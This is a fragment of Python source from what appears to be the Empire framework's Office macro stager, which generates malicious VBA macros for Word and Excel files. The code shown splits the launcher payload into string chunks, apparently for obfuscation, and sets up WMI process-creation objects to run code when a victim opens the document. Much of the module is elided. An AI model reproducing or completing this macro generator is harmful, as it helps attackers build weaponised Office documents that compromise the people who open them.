...
class Stager:
    ...
    def __init__(self, mainMenu, params=[]):
        ...
        self.info = {
            ...
            'Author': ['@enigma0x3', '@harmj0y','@micahjmartin'],

            'Description': ('Generates an office macro for Empire, compatible with office 97-2003, and 2007 file types. (Updated stager a tiny bit - Micah)'),
    ...
    def generate(self):
        ...
        if launcher == "":
            ...
            payload += "\tstr = \"" + str(chunks[0][:7]) + "\"\n"
            payload += "\tstr = str + \""+str(chunks[0][7:]) +"\"\n"
            ...
            macro += "\tDim strComputer, objWMIService, objConfig, objProcess, intProccesID, objStartup\n"
            macro += "\n\tstrComputer = \".\"\n"
